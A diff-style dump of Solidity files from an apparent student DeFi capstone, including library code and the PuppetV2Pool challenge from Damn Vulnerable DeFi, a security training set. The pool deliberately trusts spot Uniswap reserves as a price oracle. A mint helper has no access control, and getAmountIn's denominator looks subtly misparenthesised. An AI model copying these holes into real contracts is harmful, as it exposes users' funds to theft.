+  99 |     |         balanceOf[from] -= amount;
+ 100 |     | 
+ 101 |     |         // Cannot overflow because the sum of all user
+ 102 |     |         // balances can't exceed the max uint256 value.
+ 103 |     |         unchecked {
+ 104 |     |             balanceOf[to] += amount;
+ 105 |     |         }
+ 106 |     | 
+ 107 |     |         emit Transfer(from, to, amount);
+ 108 |     | 
+ 109 |     |         return true;
+ 110 |     |     }
+ 111 |     | 
+ 112 |     |     /*//////////////////////////////////////////////////////////////
+ 113 |     |                              EIP-2612 LOGIC
+ 114 |     |     //////////////////////////////////////////////////////////////*/
+ 115 |     | 
+ 116 |     |     function permit(
+ 117 |     |         address owner,
+ 118 |     |         address spender,
+ 119 |     |         uint256 value,
+ 120 |     |         uint256 deadline,
+ 121 |     |         uint8 v,
+ 122 |     |         bytes32 r,
+ 123 |     |         bytes32 s
+ 124 |     |     ) public virtual {
+ 125 |     |         require(deadline >= block.timestamp, "PERMIT_DEADLINE_EXPIRED");
+ 126 |     | 
+ 127 |     |         // Unchecked because the only math done is incrementing
+ 128 |     |         // the owner's nonce which cannot realistically overflow.
+ 129 |     |         unchecked {
+ 130 |     |             address recoveredAddress = ecrecover(
+ 131 |     |                 keccak256(
+ 132 |     |                     abi.encodePacked(
+ 133 |     |                         "\x19\x01",
+ 134 |     |                         DOMAIN_SEPARATOR(),
+ 135 |     |                         keccak256(
+ 136 |     |                             abi.encode(
+ 137 |     |                                 keccak256(
+ 138 |     |                                     "Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)"
+ 139 |     |                                 ),
+ 140 |     |                                 owner,
+ 141 |     |                                 spender,
+ 142 |     |                                 value,
+ 143 |     |                                 nonces[owner]++,
+ 144 |     |                                 deadline
+ 145 |     |                             )
+ 146 |     |                         )
+ 147 |     |                     )
+ 148 |     |                 ),
+ 149 |     |                 v,
+ 150 |     |                 r,
+ 151 |     |                 s
+ 152 |     |             );
+ 153 |     | 
+ 154 |     |             require(recoveredAddress != address(0) && recoveredAddress == owner, "INVALID_SIGNER");
+ 155 |     | 
+ 156 |     |             allowance[recoveredAddress][spender] = value;
+ 157 |     |         }
+ 158 |     | 
+ 159 |     |         emit Approval(owner, spender, value);
+ 160 |     |     }
+ 161 |     | 
+ 162 |     |     function DOMAIN_SEPARATOR() public view virtual returns (bytes32) {
+ 163 |     |         return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator();
+ 164 |     |     }
+ 165 |     | 
+ 166 | *   |     function computeDomainSeparator() internal view virtual returns (bytes32) {
+ 167 | *   |         return
+ 168 | *   |             keccak256(
+ 169 | *   |                 abi.encode(
+ 170 | *   |                     keccak256("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)"),
+ 171 | *   |                     keccak256(bytes(name)),
+ 172 | *   |                     keccak256("1"),
+ 173 | *   |                     block.chainid,
+ 174 | *   |                     address(this)
+ 175 |     |                 )
+ 176 |     |             );
+ 177 |     |     }
+ 178 |     | 
+ 179 |     |     /*//////////////////////////////////////////////////////////////
+ 180 |     |                         INTERNAL MINT/BURN LOGIC
+ 181 |     |     //////////////////////////////////////////////////////////////*/
+ 182 |     | 
+ 183 |     |     function _mint(address to, uint256 amount) internal virtual {
+ 184 |     |         totalSupply += amount;
+ 185 |     | 
+ 186 |     |         // Cannot overflow because the sum of all user
+ 187 |     |         // balances can't exceed the max uint256 value.
+ 188 |     |         unchecked {
+ 189 |     |             balanceOf[to] += amount;
+ 190 |     |         }
+ 191 |     | 
+ 192 |     |         emit Transfer(address(0), to, amount);
+ 193 |     |     }
+ 194 |     | 
+ 195 |     |     function _burn(address from, uint256 amount) internal virtual {
+ 196 |     |         balanceOf[from] -= amount;
+ 197 |     | 
+ 198 |     |         // Cannot underflow because a user's balance
+ 199 |     |         // will never be larger than the total supply.
+ 200 |     |         unchecked {
+ 201 |     |             totalSupply -= amount;
+ 202 |     |         }
+ 203 |     | 
+ 204 |     |         emit Transfer(from, address(0), amount);
+ 205 |     |     }
+ 206 |     | }
+ 207 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/tokens/WETH.sol
+  1 |     | // SPDX-License-Identifier: AGPL-3.0-only
+  2 |     | pragma solidity >=0.8.0;
+  3 |     | 
+  4 |     | import {ERC20} from "./ERC20.sol";
+  5 |     | 
+  6 |     | import {SafeTransferLib} from "../utils/SafeTransferLib.sol";
+  7 |     | 
+  8 |     | /// @notice Minimalist and modern Wrapped Ether implementation.
+  9 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/tokens/WETH.sol)
+ 10 |     | /// @author Inspired by WETH9 (https://github.com/dapphub/ds-weth/blob/master/src/weth9.sol)
+ 11 | *   | contract WETH is ERC20("Wrapped Ether", "WETH", 18) {
+ 12 |     |     using SafeTransferLib for address;
+ 13 |     | 
+ 14 |     |     event Deposit(address indexed from, uint256 amount);
+ 15 |     | 
+ 16 |     |     event Withdrawal(address indexed to, uint256 amount);
+ 17 |     | 
+ 18 |     |     function deposit() public payable virtual {
+ 19 |     |         _mint(msg.sender, msg.value);
+ 20 |     | 
+ 21 |     |         emit Deposit(msg.sender, msg.value);
+ 22 |     |     }
+ 23 |     | 
+ 24 |     |     function withdraw(uint256 amount) public virtual {
+ 25 |     |         _burn(msg.sender, amount);
+ 26 |     | 
+ 27 |     |         emit Withdrawal(msg.sender, amount);
+ 28 |     | 
+ 29 |     |         msg.sender.safeTransferETH(amount);
+ 30 |     |     }
+ 31 |     | 
+ 32 |     |     receive() external payable virtual {
+ 33 |     |         deposit();
+ 34 |     |     }
+ 35 |     | }
+ 36 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/solmate/src/utils/SafeTransferLib.sol
+   1 |     | // SPDX-License-Identifier: AGPL-3.0-only
+   2 |     | pragma solidity >=0.8.0;
+   3 |     | 
+   4 |     | import {ERC20} from "../tokens/ERC20.sol";
+   5 |     | 
+   6 |     | /// @notice Safe ETH and ERC20 transfer library that gracefully handles missing return values.
+   7 |     | /// @author Solmate (https://github.com/transmissions11/solmate/blob/main/src/utils/SafeTransferLib.sol)
+   8 |     | /// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer.
+   9 |     | library SafeTransferLib {
+  10 |     |     /*//////////////////////////////////////////////////////////////
+  11 |     |                              ETH OPERATIONS
+  12 |     |     //////////////////////////////////////////////////////////////*/
+  13 |     | 
+  14 |     |     function safeTransferETH(address to, uint256 amount) internal {
+  15 |     |         bool success;
+  16 |     | 
+  17 |     |         /// @solidity memory-safe-assembly
+  18 |     |         assembly {
+  19 |     |             // Transfer the ETH and store if it succeeded or not.
+  20 |     |             success := call(gas(), to, amount, 0, 0, 0, 0)
+  21 |     |         }
+  22 |     | 
+  23 |     |         require(success, "ETH_TRANSFER_FAILED");
+  24 |     |     }
+  25 |     | 
+  26 |     |     /*//////////////////////////////////////////////////////////////
+  27 |     |                             ERC20 OPERATIONS
+  28 |     |     //////////////////////////////////////////////////////////////*/
+  29 |     | 
+  30 |     |     function safeTransferFrom(
+  31 |     |         ERC20 token,
+  32 |     |         address from,
+  33 |     |         address to,
+  34 |     |         uint256 amount
+  35 |     |     ) internal {
+  36 |     |         bool success;
+  37 |     | 
+  38 |     |         /// @solidity memory-safe-assembly
+  39 |     |         assembly {
+  40 |     |             // Get a pointer to some free memory.
+  41 |     |             let freeMemoryPointer := mload(0x40)
+  42 |     | 
+  43 |     |             // Write the abi-encoded calldata into memory, beginning with the function selector.
+  44 |     |             mstore(freeMemoryPointer, 0x23b872dd00000000000000000000000000000000000000000000000000000000)
+  45 |     |             mstore(add(freeMemoryPointer, 4), and(from, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "from" argument.
+  46 |     |             mstore(add(freeMemoryPointer, 36), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
+  47 |     |             mstore(add(freeMemoryPointer, 68), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.
+  48 |     | 
+  49 |     |             // We use 100 because the length of our calldata totals up like so: 4 + 32 * 3.
+  50 |     |             // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
+  51 |     |             success := call(gas(), token, 0, freeMemoryPointer, 100, 0, 32)
+  52 |     | 
+  53 |     |             // Set success to whether the call reverted, if not we check it either
+  54 |     |             // returned exactly 1 (can't just be non-zero data), or had no return data and token has code.
+  55 |     |             if and(iszero(and(eq(mload(0), 1), gt(returndatasize(), 31))), success) {
+  56 |     |                 success := iszero(or(iszero(extcodesize(token)), returndatasize())) 
+  57 |     |             }
+  58 |     |         }
+  59 |     | 
+  60 |     |         require(success, "TRANSFER_FROM_FAILED");
+  61 |     |     }
+  62 |     | 
+  63 |     |     function safeTransfer(
+  64 |     |         ERC20 token,
+  65 |     |         address to,
+  66 |     |         uint256 amount
+  67 |     |     ) internal {
+  68 |     |         bool success;
+  69 |     | 
+  70 |     |         /// @solidity memory-safe-assembly
+  71 |     |         assembly {
+  72 |     |             // Get a pointer to some free memory.
+  73 |     |             let freeMemoryPointer := mload(0x40)
+  74 |     | 
+  75 |     |             // Write the abi-encoded calldata into memory, beginning with the function selector.
+  76 |     |             mstore(freeMemoryPointer, 0xa9059cbb00000000000000000000000000000000000000000000000000000000)
+  77 |     |             mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
+  78 |     |             mstore(add(freeMemoryPointer, 36), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.
+  79 |     | 
+  80 |     |             // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.
+  81 |     |             // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
+  82 |     |             success := call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)
+  83 |     | 
+  84 |     |             // Set success to whether the call reverted, if not we check it either
+  85 |     |             // returned exactly 1 (can't just be non-zero data), or had no return data and token has code.
+  86 |     |             if and(iszero(and(eq(mload(0), 1), gt(returndatasize(), 31))), success) {
+  87 |     |                 success := iszero(or(iszero(extcodesize(token)), returndatasize())) 
+  88 |     |             }
+  89 |     |         }
+  90 |     | 
+  91 |     |         require(success, "TRANSFER_FAILED");
+  92 |     |     }
+  93 |     | 
+  94 |     |     function safeApprove(
+  95 |     |         ERC20 token,
+  96 |     |         address to,
+  97 |     |         uint256 amount
+  98 |     |     ) internal {
+  99 |     |         bool success;
+ 100 |     | 
+ 101 |     |         /// @solidity memory-safe-assembly
+ 102 |     |         assembly {
+ 103 |     |             // Get a pointer to some free memory.
+ 104 |     |             let freeMemoryPointer := mload(0x40)
+ 105 |     | 
+ 106 |     |             // Write the abi-encoded calldata into memory, beginning with the function selector.
+ 107 |     |             mstore(freeMemoryPointer, 0x095ea7b300000000000000000000000000000000000000000000000000000000)
+ 108 |     |             mstore(add(freeMemoryPointer, 4), and(to, 0xffffffffffffffffffffffffffffffffffffffff)) // Append and mask the "to" argument.
+ 109 |     |             mstore(add(freeMemoryPointer, 36), amount) // Append the "amount" argument. Masking not required as it's a full 32 byte type.
+ 110 |     | 
+ 111 |     |             // We use 68 because the length of our calldata totals up like so: 4 + 32 * 2.
+ 112 |     |             // We use 0 and 32 to copy up to 32 bytes of return data into the scratch space.
+ 113 |     |             success := call(gas(), token, 0, freeMemoryPointer, 68, 0, 32)
+ 114 |     | 
+ 115 |     |             // Set success to whether the call reverted, if not we check it either
+ 116 |     |             // returned exactly 1 (can't just be non-zero data), or had no return data and token has code.
+ 117 |     |             if and(iszero(and(eq(mload(0), 1), gt(returndatasize(), 31))), success) {
+ 118 |     |                 success := iszero(or(iszero(extcodesize(token)), returndatasize())) 
+ 119 |     |             }
+ 120 |     |         }
+ 121 |     | 
+ 122 |     |         require(success, "APPROVE_FAILED");
+ 123 |     |     }
+ 124 |     | }
+ 125 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v2-core/contracts/interfaces/IUniswapV2Factory.sol
+  1 |     | pragma solidity >=0.5.0;
+  2 |     | 
+  3 |     | interface IUniswapV2Factory {
+  4 |     |     event PairCreated(address indexed token0, address indexed token1, address pair, uint);
+  5 |     | 
+  6 |     |     function feeTo() external view returns (address);
+  7 |     |     function feeToSetter() external view returns (address);
+  8 |     | 
+  9 |     |     function getPair(address tokenA, address tokenB) external view returns (address pair);
+ 10 |     |     function allPairs(uint) external view returns (address pair);
+ 11 |     |     function allPairsLength() external view returns (uint);
+ 12 |     | 
+ 13 |     |     function createPair(address tokenA, address tokenB) external returns (address pair);
+ 14 |     | 
+ 15 |     |     function setFeeTo(address) external;
+ 16 |     |     function setFeeToSetter(address) external;
+ 17 |     | }
+ 18 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v2-core/contracts/interfaces/IUniswapV2Pair.sol
+  1 |     | pragma solidity >=0.5.0;
+  2 |     | 
+  3 |     | interface IUniswapV2Pair {
+  4 |     |     event Approval(address indexed owner, address indexed spender, uint value);
+  5 |     |     event Transfer(address indexed from, address indexed to, uint value);
+  6 |     | 
+  7 |     |     function name() external pure returns (string memory);
+  8 |     |     function symbol() external pure returns (string memory);
+  9 |     |     function decimals() external pure returns (uint8);
+ 10 |     |     function totalSupply() external view returns (uint);
+ 11 |     |     function balanceOf(address owner) external view returns (uint);
+ 12 |     |     function allowance(address owner, address spender) external view returns (uint);
+ 13 |     | 
+ 14 |     |     function approve(address spender, uint value) external returns (bool);
+ 15 |     |     function transfer(address to, uint value) external returns (bool);
+ 16 |     |     function transferFrom(address from, address to, uint value) external returns (bool);
+ 17 |     | 
+ 18 |     |     function DOMAIN_SEPARATOR() external view returns (bytes32);
+ 19 |     |     function PERMIT_TYPEHASH() external pure returns (bytes32);
+ 20 |     |     function nonces(address owner) external view returns (uint);
+ 21 |     | 
+ 22 |     |     function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;
+ 23 |     | 
+ 24 |     |     event Mint(address indexed sender, uint amount0, uint amount1);
+ 25 |     |     event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
+ 26 |     |     event Swap(
+ 27 |     |         address indexed sender,
+ 28 |     |         uint amount0In,
+ 29 |     |         uint amount1In,
+ 30 |     |         uint amount0Out,
+ 31 |     |         uint amount1Out,
+ 32 |     |         address indexed to
+ 33 |     |     );
+ 34 |     |     event Sync(uint112 reserve0, uint112 reserve1);
+ 35 |     | 
+ 36 |     |     function MINIMUM_LIQUIDITY() external pure returns (uint);
+ 37 |     |     function factory() external view returns (address);
+ 38 |     |     function token0() external view returns (address);
+ 39 |     |     function token1() external view returns (address);
+ 40 |     |     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
+ 41 |     |     function price0CumulativeLast() external view returns (uint);
+ 42 |     |     function price1CumulativeLast() external view returns (uint);
+ 43 |     |     function kLast() external view returns (uint);
+ 44 |     | 
+ 45 |     |     function mint(address to) external returns (uint liquidity);
+ 46 |     |     function burn(address to) external returns (uint amount0, uint amount1);
+ 47 |     |     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
+ 48 |     |     function skim(address to) external;
+ 49 |     |     function sync() external;
+ 50 |     | 
+ 51 |     |     function initialize(address, address) external;
+ 52 |     | }
+ 53 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol
+  1 |     | pragma solidity >=0.6.2;
+  2 |     | 
+  3 |     | interface IUniswapV2Router01 {
+  4 |     |     function factory() external pure returns (address);
+  5 |     |     function WETH() external pure returns (address);
+  6 |     | 
+  7 |     |     function addLiquidity(
+  8 |     |         address tokenA,
+  9 |     |         address tokenB,
+ 10 |     |         uint amountADesired,
+ 11 |     |         uint amountBDesired,
+ 12 |     |         uint amountAMin,
+ 13 |     |         uint amountBMin,
+ 14 |     |         address to,
+ 15 |     |         uint deadline
+ 16 |     |     ) external returns (uint amountA, uint amountB, uint liquidity);
+ 17 |     |     function addLiquidityETH(
+ 18 |     |         address token,
+ 19 |     |         uint amountTokenDesired,
+ 20 |     |         uint amountTokenMin,
+ 21 |     |         uint amountETHMin,
+ 22 |     |         address to,
+ 23 |     |         uint deadline
+ 24 |     |     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
+ 25 |     |     function removeLiquidity(
+ 26 |     |         address tokenA,
+ 27 |     |         address tokenB,
+ 28 |     |         uint liquidity,
+ 29 |     |         uint amountAMin,
+ 30 |     |         uint amountBMin,
+ 31 |     |         address to,
+ 32 |     |         uint deadline
+ 33 |     |     ) external returns (uint amountA, uint amountB);
+ 34 |     |     function removeLiquidityETH(
+ 35 |     |         address token,
+ 36 |     |         uint liquidity,
+ 37 |     |         uint amountTokenMin,
+ 38 |     |         uint amountETHMin,
+ 39 |     |         address to,
+ 40 |     |         uint deadline
+ 41 |     |     ) external returns (uint amountToken, uint amountETH);
+ 42 |     |     function removeLiquidityWithPermit(
+ 43 |     |         address tokenA,
+ 44 |     |         address tokenB,
+ 45 |     |         uint liquidity,
+ 46 |     |         uint amountAMin,
+ 47 |     |         uint amountBMin,
+ 48 |     |         address to,
+ 49 |     |         uint deadline,
+ 50 |     |         bool approveMax, uint8 v, bytes32 r, bytes32 s
+ 51 |     |     ) external returns (uint amountA, uint amountB);
+ 52 |     |     function removeLiquidityETHWithPermit(
+ 53 |     |         address token,
+ 54 |     |         uint liquidity,
+ 55 |     |         uint amountTokenMin,
+ 56 |     |         uint amountETHMin,
+ 57 |     |         address to,
+ 58 |     |         uint deadline,
+ 59 |     |         bool approveMax, uint8 v, bytes32 r, bytes32 s
+ 60 |     |     ) external returns (uint amountToken, uint amountETH);
+ 61 |     |     function swapExactTokensForTokens(
+ 62 |     |         uint amountIn,
+ 63 |     |         uint amountOutMin,
+ 64 |     |         address[] calldata path,
+ 65 |     |         address to,
+ 66 |     |         uint deadline
+ 67 |     |     ) external returns (uint[] memory amounts);
+ 68 |     |     function swapTokensForExactTokens(
+ 69 |     |         uint amountOut,
+ 70 |     |         uint amountInMax,
+ 71 |     |         address[] calldata path,
+ 72 |     |         address to,
+ 73 |     |         uint deadline
+ 74 |     |     ) external returns (uint[] memory amounts);
+ 75 |     |     function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
+ 76 |     |         external
+ 77 |     |         payable
+ 78 |     |         returns (uint[] memory amounts);
+ 79 |     |     function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
+ 80 |     |         external
+ 81 |     |         returns (uint[] memory amounts);
+ 82 |     |     function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
+ 83 |     |         external
+ 84 |     |         returns (uint[] memory amounts);
+ 85 |     |     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
+ 86 |     |         external
+ 87 |     |         payable
+ 88 |     |         returns (uint[] memory amounts);
+ 89 |     | 
+ 90 |     |     function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);
+ 91 |     |     function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);
+ 92 |     |     function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);
+ 93 |     |     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
+ 94 |     |     function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);
+ 95 |     | }
+ 96 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/lib/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol
+  1 |     | pragma solidity >=0.6.2;
+  2 |     | 
+  3 |     | import './IUniswapV2Router01.sol';
+  4 |     | 
+  5 |     | interface IUniswapV2Router02 is IUniswapV2Router01 {
+  6 |     |     function removeLiquidityETHSupportingFeeOnTransferTokens(
+  7 |     |         address token,
+  8 |     |         uint liquidity,
+  9 |     |         uint amountTokenMin,
+ 10 |     |         uint amountETHMin,
+ 11 |     |         address to,
+ 12 |     |         uint deadline
+ 13 |     |     ) external returns (uint amountETH);
+ 14 |     |     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
+ 15 |     |         address token,
+ 16 |     |         uint liquidity,
+ 17 |     |         uint amountTokenMin,
+ 18 |     |         uint amountETHMin,
+ 19 |     |         address to,
+ 20 |     |         uint deadline,
+ 21 |     |         bool approveMax, uint8 v, bytes32 r, bytes32 s
+ 22 |     |     ) external returns (uint amountETH);
+ 23 |     | 
+ 24 |     |     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
+ 25 |     |         uint amountIn,
+ 26 |     |         uint amountOutMin,
+ 27 |     |         address[] calldata path,
+ 28 |     |         address to,
+ 29 |     |         uint deadline
+ 30 |     |     ) external;
+ 31 |     |     function swapExactETHForTokensSupportingFeeOnTransferTokens(
+ 32 |     |         uint amountOutMin,
+ 33 |     |         address[] calldata path,
+ 34 |     |         address to,
+ 35 |     |         uint deadline
+ 36 |     |     ) external payable;
+ 37 |     |     function swapExactTokensForETHSupportingFeeOnTransferTokens(
+ 38 |     |         uint amountIn,
+ 39 |     |         uint amountOutMin,
+ 40 |     |         address[] calldata path,
+ 41 |     |         address to,
+ 42 |     |         uint deadline
+ 43 |     |     ) external;
+ 44 |     | }
+ 45 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/exchange/ERC20Mint.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity ^0.8.19;
+  3 |     | 
+  4 |     | import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+  5 |     | 
+  6 |     | contract ERC20Mint is ERC20 {
+  7 |     |     constructor(string memory name_, string memory symbol_) ERC20(name_, symbol_) {}
+  8 |     | 
+  9 |     |     function mint(address to, uint256 amount) external {
+ 10 |     |         require(to != address(0), "Invalid mint to zero address");
+ 11 |     |         _mint(to, amount);
+ 12 |     |     }
+ 13 |     | }
+ 14 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/puppet-v2/PuppetV2Pool.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
+  3 |     | pragma solidity ^0.8.24;
+  4 |     | 
+  5 |     | import {UniswapV2Library} from "./UniswapV2Library.sol";
+  6 |     | 
+  7 |     | interface IERC20 {
+  8 |     |     function transfer(address to, uint256 amount) external returns (bool);
+  9 |     |     function transferFrom(address from, address to, uint256 amount) external returns (bool);
+ 10 |     |     function balanceOf(address account) external returns (uint256);
+ 11 |     | }
+ 12 |     | 
+ 13 |     | contract PuppetV2Pool {
+ 14 |     |     address private _uniswapPair;
+ 15 |     |     address private _uniswapFactory;
+ 16 |     |     IERC20 private _token;
+ 17 |     |     IERC20 private _weth;
+ 18 |     | 
+ 19 |     |     mapping(address => uint256) public deposits;
+ 20 |     | 
+ 21 |     |     event Borrowed(address indexed borrower, uint256 depositRequired, uint256 borrowAmount, uint256 timestamp);
+ 22 |     | 
+ 23 |     |     constructor(address wethAddress, address tokenAddress, address uniswapPairAddress, address uniswapFactoryAddress) {
+ 24 |     |         _weth = IERC20(wethAddress);
+ 25 |     |         _token = IERC20(tokenAddress);
+ 26 |     |         _uniswapPair = uniswapPairAddress;
+ 27 |     |         _uniswapFactory = uniswapFactoryAddress;
+ 28 |     |     }
+ 29 |     | 
+ 30 |     |     /**
+ 31 |     |      * @notice Allows borrowing tokens by first depositing three times their value in WETH
+ 32 |     |      *         Sender must have approved enough WETH in advance.
+ 33 |     |      *         Calculations assume that WETH and borrowed token have same amount of decimals.
+ 34 |     |      */
+ 35 |     |     function borrow(uint256 borrowAmount) external {
+ 36 |     |         // Calculate how much WETH the user must deposit
+ 37 |     |         uint256 amount = calculateDepositOfWETHRequired(borrowAmount);
+ 38 |     | 
+ 39 |     |         // Take the WETH
+ 40 |     |         _weth.transferFrom(msg.sender, address(this), amount);
+ 41 |     | 
+ 42 |     |         // internal accounting
+ 43 |     |         deposits[msg.sender] += amount;
+ 44 |     | 
+ 45 |     |         require(_token.transfer(msg.sender, borrowAmount), "Transfer failed");
+ 46 |     | 
+ 47 |     |         emit Borrowed(msg.sender, amount, borrowAmount, block.timestamp);
+ 48 |     |     }
+ 49 |     | 
+ 50 |     |     function calculateDepositOfWETHRequired(uint256 tokenAmount) public view returns (uint256) {
+ 51 |     |         uint256 depositFactor = 3;
+ 52 |     |         return _getOracleQuote(tokenAmount) * depositFactor / 1 ether;
+ 53 |     |     }
+ 54 |     | 
+ 55 |     |     // Fetch the price from Uniswap v2 using the official libraries
+ 56 |     |     function _getOracleQuote(uint256 amount) private view returns (uint256) {
+ 57 |     |         (uint256 reservesWETH, uint256 reservesToken) =
+ 58 |     |             UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});
+ 59 |     | 
+ 60 |     |         return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
+ 61 |     |     }
+ 62 |     | }
+ 63 |     | 
+
+/home/chase/Documents/RIT/RIT_2025/capstone/defi_capstone/src/puppet-v2/UniswapV2Library.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | // Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
+   3 |     | pragma solidity ^0.8.24;
+   4 |     | 
+   5 |     | import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
+   6 |     | 
+   7 |     | /**
+   8 |     |  * Modernized version of https://github.com/Uniswap/v2-periphery/blob/master/contracts/libraries/UniswapV2Library.sol
+   9 |     |  */
+  10 |     | library UniswapV2Library {
+  11 |     |     // returns sorted token addresses, used to handle return values from pairs sorted in this order
+  12 |     |     function sortTokens(address tokenA, address tokenB) internal pure returns (address token0, address token1) {
+  13 |     |         require(tokenA != tokenB, "UniswapV2Library: IDENTICAL_ADDRESSES");
+  14 |     |         (token0, token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
+  15 |     |         require(token0 != address(0), "UniswapV2Library: ZERO_ADDRESS");
+  16 |     |     }
+  17 |     | 
+  18 |     |     // calculates the CREATE2 address for a pair without making any external calls
+  19 |     |     function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
+  20 |     |         (address token0, address token1) = sortTokens(tokenA, tokenB);
+  21 |     |         pair = address(
+  22 |     |             uint160(
+  23 |     |                 uint256(
+  24 |     |                     keccak256(
+  25 |     |                         abi.encodePacked(
+  26 |     |                             hex"ff",
+  27 |     |                             factory,
+  28 |     |                             keccak256(abi.encodePacked(token0, token1)),
+  29 |     |                             hex"96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f" // init code hash
+  30 |     |                         )
+  31 |     |                     )
+  32 |     |                 )
+  33 |     |             )
+  34 |     |         );
+  35 |     |     }
+  36 |     | 
+  37 |     |     // fetches and sorts the reserves for a pair
+  38 |     |     function getReserves(address factory, address tokenA, address tokenB)
+  39 |     |         internal
+  40 |     |         view
+  41 |     |         returns (uint256 reserveA, uint256 reserveB)
+  42 |     |     {
+  43 |     |         (address token0,) = sortTokens(tokenA, tokenB);
+  44 |     |         (uint256 reserve0, uint256 reserve1,) = IUniswapV2Pair(pairFor(factory, tokenA, tokenB)).getReserves();
+  45 |     |         (reserveA, reserveB) = tokenA == token0 ? (reserve0, reserve1) : (reserve1, reserve0);
+  46 |     |     }
+  47 |     | 
+  48 |     |     // given some amount of an asset and pair reserves, returns an equivalent amount of the other asset
+  49 |     |     function quote(uint256 amountA, uint256 reserveA, uint256 reserveB) internal pure returns (uint256 amountB) {
+  50 |     |         require(amountA > 0, "UniswapV2Library: INSUFFICIENT_AMOUNT");
+  51 |     |         require(reserveA > 0 && reserveB > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
+  52 |     |         amountB = amountA * reserveB / reserveA;
+  53 |     |     }
+  54 |     | 
+  55 |     |     // given an input amount of an asset and pair reserves, returns the maximum output amount of the other asset
+  56 |     |     function getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut)
+  57 |     |         internal
+  58 |     |         pure
+  59 |     |         returns (uint256 amountOut)
+  60 |     |     {
+  61 |     |         require(amountIn > 0, "UniswapV2Library: INSUFFICIENT_INPUT_AMOUNT");
+  62 |     |         require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
+  63 |     |         uint256 amountInWithFee = amountIn * 997;
+  64 |     |         uint256 numerator = amountInWithFee * reserveOut;
+  65 |     |         uint256 denominator = reserveIn * 1000 + amountInWithFee;
+  66 |     |         amountOut = numerator / denominator;
+  67 |     |     }
+  68 |     | 
+  69 |     |     // given an output amount of an asset and pair reserves, returns a required input amount of the other asset
+  70 |     |     function getAmountIn(uint256 amountOut, uint256 reserveIn, uint256 reserveOut)
+  71 |     |         internal
+  72 |     |         pure
+  73 |     |         returns (uint256 amountIn)
+  74 |     |     {
+  75 |     |         require(amountOut > 0, "UniswapV2Library: INSUFFICIENT_OUTPUT_AMOUNT");
+  76 |     |         require(reserveIn > 0 && reserveOut > 0, "UniswapV2Library: INSUFFICIENT_LIQUIDITY");
+  77 |     |         uint256 numerator = reserveIn * amountOut * 1000;
+  78 |     |         uint256 denominator = reserveOut - amountOut * 997;
+  79 |     |         amountIn = (numerator / denominator) + (1);
+  80 |     |     }
+  81 |     | 
+  82 |     |     // performs chained getAmountOut calculations on any number of pairs
+  83 |     |     function getAmountsOut(address factory, uint256 amountIn, address[] memory path)
+  84 |     |         internal
+  85 |     |         view
+  86 |     |         returns (uint256[] memory amounts)
